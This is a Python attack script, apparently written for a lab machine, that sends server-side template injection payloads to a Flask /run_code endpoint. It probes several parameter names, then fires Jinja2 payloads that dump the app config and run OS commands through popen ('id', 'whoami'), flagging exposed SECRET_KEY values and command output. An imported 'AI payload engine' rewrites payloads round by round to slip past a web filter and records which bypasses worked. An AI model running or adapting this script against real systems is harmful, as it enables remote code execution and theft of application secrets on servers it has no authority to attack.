#!/usr/bin/env python3
import asyncio
import requests
from app.core.ai_payload_engine import AIPayloadEngine, ResponseType

async def targeted_ai_ssti_test():
    """Target the discovered /run_code endpoint with AI adaptation"""
    base_url = "http://10.10.11.62:5000"
    target_endpoint = f"{base_url}/run_code"
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    ai_engine = AIPayloadEngine()
    
    print("Targeted AI SSTI Test - /run_code Endpoint")
    print("="*50)
    print(f"Target: {target_endpoint}")
    
    # Test the /run_code endpoint specifically
    test_params = ['code', 'input', 'data', 'content', 'template']
    
    for param in test_params:
        print(f"\n[TESTING] Parameter: {param}")
        
        # Start with simple math evaluation
        initial_payload = "{{7*7}}"
        current_payload = initial_payload
        max_rounds = 5
        
        for round_num in range(1, max_rounds + 1):
            print(f"  Round {round_num}: Testing {current_payload}")
            
            try:
                # Try POST request to /run_code
                response = session.post(target_endpoint, data={param: current_payload}, timeout=10)
                
                response_data = {
                    'status_code': response.status_code,
                    'content': response.text,
                    'headers': dict(response.headers)
                }
                
                print(f"    Status: {response.status_code}")
                print(f"    Content length: {len(response.text)}")
                
                # AI classification and adaptation
                result_type, next_payload = ai_engine.process_response_and_adapt(
                    base_url, current_payload, response_data
                )
                
                print(f"    AI Classification: {result_type.value}")
                
                # Check for specific success indicators
                if '49' in response.text and current_payload == "{{7*7}}":
                    print(f"    SUCCESS: Math evaluation detected! (7*7 = 49)")
                    
                    # Try Flask-specific payloads
                    flask_payloads = [
                        "{{config}}",
                        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                        "{{url_for.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}"
                    ]
                    
                    for flask_payload in flask_payloads:
                        try:
                            flask_response = session.post(target_endpoint, data={param: flask_payload}, timeout=10)
                            print(f"    Flask test: {flask_payload[:30]}...")
                            print(f"    Response: {flask_response.text[:100]}...")
                            
                            if 'SECRET_KEY' in flask_response.text or 'DEBUG' in flask_response.text:
                                print(f"    CRITICAL: Flask config exposed!")
                            if 'uid=' in flask_response.text or 'root' in flask_response.text:
                                print(f"    CRITICAL: Command execution confirmed!")
                                
                        except Exception as e:
                            print(f"    Flask test error: {e}")
                    
                    return True
                
                # Check for connection reset (potential filtering)
                if response.status_code == 0 or 'connection_error' in response_data:
                    print(f"    Connection reset detected - likely filtered")
                    result_type = ResponseType.FILTERED
                
                # If AI suggests next payload, use it
                if next_payload and next_payload != current_payload:
                    current_payload = next_payload
                    print(f"    AI suggests next: {current_payload[:50]}...")
                else:
                    break
                    
            except requests.exceptions.ConnectionError as e:
                if "forcibly closed" in str(e):
                    print(f"    Connection forcibly closed - WAF/filter detected")
                    # AI should classify this as FILTERED
                    response_data = {'status_code': 0, 'content': '', 'connection_error': True}
                    result_type, next_payload = ai_engine.process_response_and_adapt(
                        base_url, current_payload, response_data
                    )
                    print(f"    AI Classification: {result_type.value}")
                    
                    if next_payload and next_payload != current_payload:
                        current_payload = next_payload
                        print(f"    AI bypass attempt: {current_payload[:50]}...")
                        continue
                    else:
                        break
                else:
                    print(f"    Connection error: {e}")
                    break
                    
            except Exception as e:
                print(f"    Error: {e}")
                break
    
    # Show AI learning
    intelligence = ai_engine.get_target_intelligence(base_url)
    print(f"\n[AI INTELLIGENCE] Learning Summary:")
    print(f"  Blocked tokens: {intelligence['blocked_tokens']}")
    print(f"  Working bypasses: {len(intelligence['working_bypasses'])}")
    print(f"  Successful payloads: {len(intelligence['successful_payloads'])}")
    print(f"  Recommended approach: {intelligence['recommended_approach']}")
    
    return False

if __name__ == "__main__":
    result = asyncio.run(targeted_ai_ssti_test())
    if result:
        print("\n[SUCCESS] AI confirmed SSTI vulnerability!")
    else:
        print("\n[RESULT] No SSTI confirmed, but AI learned from responses.")